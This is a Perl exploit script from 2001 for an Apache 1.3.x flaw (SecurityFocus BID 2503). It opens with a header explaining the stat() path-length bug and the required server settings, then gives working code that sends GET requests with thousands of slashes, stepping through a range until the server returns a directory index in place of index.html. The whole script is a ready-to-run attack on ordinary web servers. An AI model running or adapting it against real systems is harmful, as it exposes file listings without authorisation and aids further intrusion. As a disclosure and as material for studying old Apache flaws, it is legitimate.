#!/usr/bin/perl
#
# farm9, Inc. (copyright 2001)
#
# Name: Apache Artificially Long Slash Path Directory Listing Exploit
# Author: Matt Watchinski
# Ref: SecurityFocus BID 2503
#
# Affects: Apache 1.3.17 and below
# Tested on: Apache 1.3.12 running on Debian 2.2
#
# Info:  This exploit tricks apache into returning a Index of the a directory
#    even if an index.html file is present.  May not work on some OS's
#
# Details: http_request.c has a subroutine called ap_sub_req_lookup_file that in
#	   very specific cases would feed stat() a filename that was longer than
#	   stat() could handle.  This would result in a condition where stat()
#	   would return 0 and a directory index would be returned instead of the
#	   default index.html.
#
# Code Fragment: /src/main/http_request.c
#    if (strchr(new_file, '/') == NULL) {
#        char *udir = ap_make_dirstr_parent(rnew->pool, r->uri);
#
#        rnew->uri = ap_make_full_path(rnew->pool, udir, new_file);
#        rnew->filename = ap_make_full_path(rnew->pool, fdir, new_file);
#        ap_parse_uri(rnew, rnew->uri);    /* fill in parsed_uri values */
#        if (stat(rnew->filename, &rnew->finfo) < 0) {   <-- Important part
#            rnew->finfo.st_mode = 0;
#        }
#
# Conditions: Mod_dir / Mod_autoindex / Mod_negotiation need to be enabled
#	      The directory must also have the following Options enabled:
#             Indexes and MultiView
#	      Some OS's have different conditions on the number of character
#	      you have to pass to stat to make this work.  If stat doesn't
#	      return 0 for path names less than 8192 or so internal apache
#	      buffer checks will stop this exploit from working.
#
# 	      Debian needed around 4060 /'s to make this work.
#
# Greets: Special thanks to natasha who added a lot of debug to apache for me
#	  while i was trying to figure out what had to be enabled to make this
#	  exploit work.  Also thanks to rfp for pointing out that MultiView
#	  needed to be enabled.
#
# More Greets:  Jeff for not shooting me :) <All your Cisco's belong to us>
#               Anne for being so sexy <I never though corporate espionage
#                   would be so fun>
#               All my homies at farm9
#               DJ Charles / DJ NoloN for the phat beats
#               Marty (go go gadget snort)
#               All my ex-bees
#               RnVjazpIaXZlcndvcmxk
#
# I think that wraps it up.  Have fun.
#
# Usage: ./apacheIndex.pl <host> <port> <HI> <Low>
# Where: Hi and low are the range for the number of / to try
#

use IO::Socket;

$low  = $ARGV[3]; #Low number of slash characters to try
$hi   = $ARGV[2]; #High number of slash characters to try
$port = $ARGV[1]; #Port to try to connect to
$host = $ARGV[0]; #Host to try to connect to

# Main loop.  Not much to this exploit once you figure out what needed to
# be enabled.  Need to do some more testing on sub-dirs to see if it
# works with them.  It should. Also different OS's might use a different number
# of /.  Send me the numbers if you don't mind matt@farm9.com

while($low <= $hi)
{

$socket = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => "TCP") or die "Connect Failed";

  $url = "";
  $buffer = "";
  $end = "";

  $url = "GET ";
  $buffer = "/" x $low . " HTTP/1.0\r\n";
  $end = "\r\n\r\n";

  $url = $url . $buffer . $end;

  print $socket "$url";
  while(<$socket>)
  {
    if($_ =~ "Index of")
    {
      print "Found the magic number: $low\n";
      print "Now go do it by hand to to see it all\n";
      close($socket);
      exit;
    }
  }

  close($socket);
  $low++;
}
